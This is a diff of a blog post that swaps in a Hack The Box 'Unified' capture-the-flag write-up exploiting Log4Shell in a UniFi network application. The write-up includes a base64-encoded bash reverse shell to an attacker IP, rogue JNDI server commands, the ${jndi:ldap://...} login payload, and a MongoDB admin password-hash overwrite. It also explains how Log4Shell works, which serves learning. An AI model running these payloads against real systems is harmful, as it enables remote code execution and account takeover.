@@ -1,24 +1,164 @@
 ---
-title: 'HKCERT25 (WEB) -  react'
-publishedAt: '2025-12-12'
+title: 'HTB - Unified'
+publishedAt: '2026-08-02'
 summary: ''
 category: 'writeups'
-competition: 'hkcert25'
+competition: 'htb'
 ---
-## 1. Challenge Information
+## Nmap Recon
 
-![Screenshot 2025-12-20 at 06.43.49.png](/image/writing/competition/hkcert25-react/1.png)
+![Screenshot 2026-02-05 at 09.20.09.png](/image/writing/competition/htb-unified/1.png)
 
-- Category: Web
-- Difficulty: Easy
+There is a UniFi network application version 6.4.54 running on port 8443.
 
-## 2. TL;DR Solution Summary
+## Testing for Log4Shell Vulnerability
 
-> The web app is vulnerable to React RCE vulnerabilities [CVE-2025-55182](https://www.cve.org/CVERecord?id=CVE-2025-55182)
-> 
+UniFi network application version 6.4.54 is vulnerable to RCE, due to the Log4Shell (CVE-2021-44228). To test it, we try to force the server to make an outbound LDAP request to our machine. We first run tcpdump on port 389 to monitor any incoming request by:
 
-## 3. Exploitation
+```php
+tcpdump -i utun4 port 389
+```
 
-- I use a script from github ( [https://github.com/Rat5ak/CVE-2025-55182-React2Shell-RCE-POC](https://github.com/Rat5ak/CVE-2025-55182-React2Shell-RCE-POC) ) to exploit it
-    
-    ![Screenshot 2025-12-20 at 06.44.46.png](/image/writing/competition/hkcert25-react/2.png)
+Then, we inject an LDAP request to the `remember` field  of the login POST request.
+
+![Screenshot 2026-02-06 at 21.24.17.png](/image/writing/competition/htb-unified/2.png)
+
+Our machine record the LDAP request made by the server, indicating that the server is vulnerable to Log4Shell.
+
+![Screenshot 2026-02-07 at 04.46.01.png](/image/writing/competition/htb-unified/3.png)
+
+## Initiating a Reverse Shell
+
+To initiate a reverse shell, we setup a malicious JNDI server using [https://github.com/veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi). We encode the malicious command to base64 to prevent any encoding issue:
+
+```php
+echo "bash -c 'bash -i 1>& /dev/tcp/10.10.15.207/1337 0>&1'"|base64
+# YmFzaCAtYyAnYmFzaCAtaSAxPiYgL2Rldi90Y3AvMTAuMTAuMTUuMjA3LzEzMzcgMD4mMScK
+```
+
+We then start the rogue JNDI server that hosts the encoded malicious code:
+
+```bash
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSAxPiYgL2Rldi90Y3AvMTAuMTAuMTUuMjA3LzEzMzcgMD4mMScK}|{base64,-d}|{bash,-i}" --hostname "10.10.15.207"
+
++-+-+-+-+-+-+-+-+-+
+|R|o|g|u|e|J|n|d|i|
++-+-+-+-+-+-+-+-+-+
+Starting HTTP server on 0.0.0.0:8000
+Starting LDAP server on 0.0.0.0:1389
+Mapping ldap://10.10.15.207:1389/o=tomcat to artsploit.controllers.Tomcat
+Mapping ldap://10.10.15.207:1389/o=websphere2 to artsploit.controllers.WebSphere2
+Mapping ldap://10.10.15.207:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
+Mapping ldap://10.10.15.207:1389/o=groovy to artsploit.controllers.Groovy
+Mapping ldap://10.10.15.207:1389/ to artsploit.controllers.RemoteReference
+Mapping ldap://10.10.15.207:1389/o=reference to artsploit.controllers.RemoteReference
+Mapping ldap://10.10.15.207:1389/o=websphere1 to artsploit.controllers.WebSphere1
+Mapping ldap://10.10.15.207:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
+Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
+```
+
+We also setup a netcat listener on port 1337:
+
+```php
+nc -lv 1337
+```
+
+We then force the server to make a JNDI lookup to our rogue LDAP sever by sending the following payload into the login POST request:
+
+```bash
+"username":"test",
+"password":"test",
+"remember":"${jndi:ldap://10.10.15.207:1389/o=tomcat}",
+"strict":true
+```
+
+```bash
+echo "curl 10.10.15.207:4444" | base64
+rogue-jndi % java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,Y3VybCAxMC4xMC4xNS4yMDc6NDQ0NAo=}|{base64,-d}|{bash,-i}" --hostname "10.10.15.207"
+```
+
+![Screenshot 2026-02-07 at 10.30.35.png](/image/writing/competition/htb-unified/4.png)
+
+Once the reverse shell is achieved, we upgrade it into a tty by using the following command:
+
+```bash
+script /dev/null -c bash
+```
+
+![Screenshot 2026-02-07 at 10.32.30.png](/image/writing/competition/htb-unified/5.png)
+
+The first flag (user.txt) was found at `/home/michael/user.txt` : 6ced1a6a89e666c0620cdb10262ba127
+
+![Screenshot 2026-02-07 at 10.33.47.png](/image/writing/competition/htb-unified/6.png)
+
+## Privilege Escalation
+
+Based on this article https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi, the MongoDB instance storing all application information is listening on [localhost](http://localhost) without authentication. Therefore, any user can read, update, or add information to it. We choose to update the hashed password of the administrator with out controlled value. We get the name of the database by connecting to the mongodb and list the database names (the database name is ace):
+
+```bash
+mongosh --host 127.0.0.1 --port 27117
+```
+
+To  get the hashed password, we execute the following command, which uses the eval function to run the JS:
+
+```bash
+ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+```
+
+![Screenshot 2026-02-07 at 11.04.11.png](/image/writing/competition/htb-unified/7.png)
+
+The identifier is $6$ which means that it is a SHA-512. Therefore, we create a new SHA-512 hashed password to replace it using this command:
+
+```bash
+mkpasswd -m sha-512 Password1234
+# $6$66oUwipesRrxXqAj$ZsEQoW86MC9i17/ecK1IWMimCxSfRvoadDt25zmCDVdeS7WNjOq97KkgPYC6l1W.1Kppt7CtMlHNaURzmUCds0
+```
+
+Then we update the password in the mongodb database by running this command:
+
+```bash
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$66oUwipesRrxXqAj$ZsEQoW86MC9i17/ecK1IWMimCxSfRvoadDt25zmCDVdeS7WNjOq97KkgPYC6l1W.1Kppt7CtMlHNaURzmUCds0"}})'
+```
+
+Then, we can login to the UniFi page using the credentials, and enable SSH under settings → Site. The password is `NotACrackablePassword4U2022`
+
+![Screenshot 2026-02-07 at 10.50.14.png](/image/writing/competition/htb-unified/8.png)
+
+We then initiate an SSH connection using the credential, and retrieve the root flag:
+
+```bash
+ssh administrator@10.129.145.94
+root@unified:~# ls
+root.txt
+root@unified:~# pwd
+/root
+root@unified:~# cat root.txt
+e50bc93c75b634e4b272d2f771c336
+```
+
+## Background
+
+### Lightweight Directory Access Protocol (LDAP)
+
+LDAP is a directory service is a specialized database  to store, organize, and retrieve information about objects in a network in a structured and searchable way. Each entry is an object which has multiple attributes. It is typically used for centralized login management, access control, policy enforcement, and service discovery. LDAP is an application layer protocol to access the directory service over an IP network.
+
+### Log4Shell (**CVE-2021-44228**)
+
+Log4Shell is a vulnerability reported in November 2021 in log4j, a java-based logging utility. It takes advantage of Log4j ability to request to LDAP and JNDI servers, allowing attackers to execute Java code on the server. Log4Shell is caused by attacker taking advantage over two Log4J features, which are JNDI and message lookup substitution. 
+
+Java Naming and Directory Interface (JNDI) is a java API for directory service that allows Java software clients to discover and look up data and resources (in the forms of Java objects) via a name. It is typically used to connect Java application to an external directory service, using protocol like lDAP. JNDI lookup is a command that tells the app to go to a server and download a specific object. The older version of Log4j automatically run any code downloaded.
+
+Message lookup substitution allows users and apps to send variables to Log4J within log messages by using syntax: `${prefix:name}`. When Log4J encounters the syntax, it resolves the variable and records it in the log. Attackers take advantage of this feature to make the server performs a JNDI lookup to the attacker controlled LDAP server which stores malicious code. Log4J will resolve the variable by reaching out to the specified location, and execute it automatically.
+
+### UniFi network application
+
+UniFi network application is network management software to configure and manage UniFi networking devices by Ubiquity. Versions before 6.5.54 (including 6.4.54)  are vulnerable to remote code execution due to the Log4Shell (CVE-2021-44228). The vulnerable part is at the log in function, where attacker can inject command into the `remember` variable, which then force the server to make JNDI lookup to a malicious LDAP server that host malicious command. Attacker can create the malicious LDAP server using [https://github.com/veracode-research/rogue-jndi](https://github.com/veracode-research/rogue-jndi) .
+
+## References
+
+- [https://app.hackthebox.com/machines/Unified](https://app.hackthebox.com/machines/Unified)
+- [https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface)
+- [https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi)
+- [https://www.picussecurity.com/resource/blog/simulating-and-preventing-cve-2021-44228-apache-log4j-rce-exploits](https://www.picussecurity.com/resource/blog/simulating-and-preventing-cve-2021-44228-apache-log4j-rce-exploits)
+- [https://en.wikipedia.org/wiki/Log4Shell](https://en.wikipedia.org/wiki/Log4Shell)
+- [https://www.ibm.com/think/topics/log4shell](https://www.ibm.com/think/topics/log4shell)
